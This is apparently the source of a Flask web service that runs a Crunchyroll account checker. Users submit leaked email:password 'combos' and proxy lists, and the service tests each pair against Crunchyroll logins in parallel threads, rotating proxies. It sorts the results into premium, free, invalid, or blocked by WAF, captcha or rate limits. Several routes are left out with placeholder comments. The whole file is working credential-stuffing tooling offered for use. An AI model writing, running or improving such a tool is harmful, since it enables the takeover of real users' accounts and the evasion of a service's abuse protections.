
import os
import sys
import uuid
import threading
import io
import csv
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

sys.path.insert(0, os.path.dirname(__file__))
from gug import CrunchyrollChecker, ProxyManager, StatsTracker, is_valid_email, is_blacklisted_domain

# Reduce logging in production (Render free tier has log limits)
logging.basicConfig(
    level=logging.WARNING if os.environ.get('FLASK_ENV') == 'production' else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

def create_app():
    app = Flask(__name__)
    app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())
    app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
    
    CORS(app)
    
    limiter = Limiter(
        key_func=get_remote_address,
        app=app,
        default_limits=["200 per day", "50 per hour"],
        storage_uri="memory://"
    )
    
    jobs = {}
    jobs_lock = threading.Lock()
    
    JOB_CLEANUP_HOURS = 24
    
    @app.after_request
    def add_security_headers(response):
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'SAMEORIGIN'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        return response
    
    def get_job_by_id(job_id):
        with jobs_lock:
            return jobs.get(job_id)
    
    def set_job(job_id, job_data):
        with jobs_lock:
            jobs[job_id] = job_data
    
    def delete_job(job_id):
        with jobs_lock:
            if job_id in jobs:
                del jobs[job_id]
    
    def get_job_id_from_request():
        job_id = request.args.get('job_id') or request.headers.get('X-Job-ID')
        if not job_id and request.is_json:
            data = request.get_json(silent=True)
            if data:
                job_id = data.get('job_id')
        return job_id
    
    def cleanup_old_jobs():
        with jobs_lock:
            now = datetime.now()
            expired = []
            for jid, job in list(jobs.items()):
                started = job.get('started_at')
                if started and not job.get('is_running'):
                    try:
                        start_time = datetime.fromisoformat(started)
                        if (now - start_time).total_seconds() / 3600 > JOB_CLEANUP_HOURS:
                            expired.append(jid)
                    except:
                        expired.append(jid)
            for jid in expired:
                jobs.pop(jid, None)
            if expired:
                logger.info(f"Cleaned up {len(expired)} old jobs")

    @app.route('/')
    def index():
        return render_template('index.html')
    
    @app.route('/api/check', methods=['POST'])
    @limiter.limit("8 per minute")  # Slightly lower to avoid free tier bans
    def check_accounts():
        try:
            data = request.json
            if not data:
                return jsonify({'error': 'Invalid request data'}), 400
        except:
            return jsonify({'error': 'Invalid JSON data'}), 400
        
        combos_text = data.get('combos', '').strip()
        proxies_text = data.get('proxies', '').strip()
        use_brutal = bool(data.get('brutal_mode', False))
        use_ultra = bool(data.get('ultra_mode', False))
        validate_proxies = bool(data.get('validate_proxies', False))
        threads = max(1, min(int(data.get('threads', 10)), 30))  # Limit to 30 on free tier
        
        if not combos_text:
            return jsonify({'error': 'No combos provided'}), 400
        
        combos = [line.strip() for line in combos_text.split('\n') if ':' in line.strip()]
        if not combos:
            return jsonify({'error': 'No valid combos (email:pass)'}), 400
        
        valid_combos = []
        for combo in combos:
            parts = combo.split(':', 1)
            if len(parts) != 2:
                continue
            email, password = parts[0].strip(), parts[1].strip()
            if is_valid_email(email) and not is_blacklisted_domain(email) and password:
                valid_combos.append((email, password))
        
        if not valid_combos:
            return jsonify({'error': 'All combos invalid or blacklisted'}), 400
        
        proxy_list = [p.strip() for p in proxies_text.split('\n') if p.strip() and not p.startswith('#')]
        
        cleanup_old_jobs()
        
        job_id = str(uuid.uuid4())
        job_data = {
            'job_id': job_id,
            'is_running': True,
            'stats': StatsTracker(len(valid_combos)),
            'results': [],
            'current_combo': '',
            'progress': 0,
            'error': None,
            'started_at': datetime.now().isoformat(),
            'total_combos': len(valid_combos)
        }
        set_job(job_id, job_data)
        
        logger.info(f"Job {job_id[:8]} started | {len(valid_combos)} combos | threads={threads}")
        
        def run_check():
            try:
                proxy_mgr = ProxyManager()
                if proxy_list:
                    for proxy in proxy_list:
                        parsed = proxy_mgr._parse_proxy(proxy)
                        if parsed:
                            proxy_mgr.proxies.append(parsed)
                    if proxy_mgr.proxies:
                        proxy_mgr.use_proxies = True
                        proxy_mgr.proxies = list(set(proxy_mgr.proxies))
                        if validate_proxies:
                            proxy_mgr.validate_proxies(max_threads=10, timeout=5)
                
                def check_single(email, password):
                    job = get_job_by_id(job_id)
                    if not job or not job.get('is_running'):
                        return None
                    
                    checker = CrunchyrollChecker(
                        proxy_manager=proxy_mgr,
                        brutal_mode=use_brutal,
                        ultra_mode=use_ultra,
                        skip_optional=True
                    )
                    
                    try:
                        result = checker.login(email, password)
                        if isinstance(result, dict):
                            if 'access_token' in result:
                                status = 'premium'
                            elif 'error' in result:
                                err = result['error']
                                if err in ['waf_blocked', 'captcha_required', 'rate_limited']:
                                    status = 'blocked'
                                else:
                                    status = 'invalid'
                            else:
                                status = 'free'
                        else:
                            status = 'error'
                        
                        return {
                            'email': email,
                            'status': status,
                            'timestamp': datetime.now().isoformat()
                        }
                    except:
                        return {
                            'email': email,
                            'status': 'error',
                            'timestamp': datetime.now().isoformat()
                        }
                
                checked = 0
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = {
                        executor.submit(check_single, email, pwd): email
                        for email, pwd in valid_combos
                    }
                    
                    for future in as_completed(futures):
                        job = get_job_by_id(job_id)
                        if not job or not job.get('is_running'):
                            break
                        
                        result = future.result()
                        if result:
                            with jobs_lock:
                                if job_id in jobs:
                                    jobs[job_id]['results'].append(result)
                                    jobs[job_id]['stats'].record_check(result['status'])
                                    jobs[job_id]['current_combo'] = result['email']
                                    checked += 1
                                    jobs[job_id]['progress'] = int((checked / len(valid_combos)) * 100)
                
                logger.info(f"Job {job_id[:8]} completed")
            
            except Exception as e:
                logger.error(f"Job {job_id[:8]} fatal error: {e}")
                with jobs_lock:
                    if job_id in jobs:
                        jobs[job_id]['error'] = str(e)
            
            finally:
                with jobs_lock:
                    if job_id in jobs:
                        jobs[job_id]['is_running'] = False
                        jobs[job_id]['progress'] = 100
        
        thread = threading.Thread(target=run_check, daemon=True)
        thread.start()
        
        return jsonify({
            'message': 'Checking started',
            'job_id': job_id,
            'total_combos': len(valid_combos),
            'threads': threads
        }), 200

    # Keep the rest of your routes unchanged (status, results, export, stop, clear, health)
    # ... (your existing @app.route('/api/status'), etc. remain the same)

    @app.route('/api/status')
    @limiter.limit("60 per minute")
    def get_status():
        job_id = get_job_id_from_request()
        if not job_id:
            return jsonify({'error': 'No job_id', 'is_running': False, 'progress': 0}), 400
        
        job = get_job_by_id(job_id)
        if not job:
            return jsonify({'error': 'Job not found', 'is_running': False, 'progress': 0}), 404
        
        stats = job.get('stats')
        return jsonify({
            'is_running': job.get('is_running', False),
            'progress': job.get('progress', 0),
            'current': job.get('current_combo', ''),
            'results_count': len(job.get('results', [])),
            'error': job.get('error'),
            'job_id': job_id,
            'total_combos': job.get('total_combos', 0),
            'stats': {
                'checked': stats.checked if stats else 0,
                'premium': stats.premium if stats else 0,
                'free': stats.free if stats else 0,
                'invalid': stats.invalid if stats else 0,
                'blocked': stats.blocked if stats else 0,
                'cpm': round(stats.get_cpm(), 1) if stats else 0,
                'eta': stats.get_eta() if stats else 'N/A',
            }
        })

    # Keep other routes exactly as before: /api/results, /api/export, /api/stop, /api/clear, /health, error handlers

    # ... (copy-paste your existing routes below this line unchanged)

    return app


app = create_app()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(host='0.0.0.0', port=port, debug=debug)
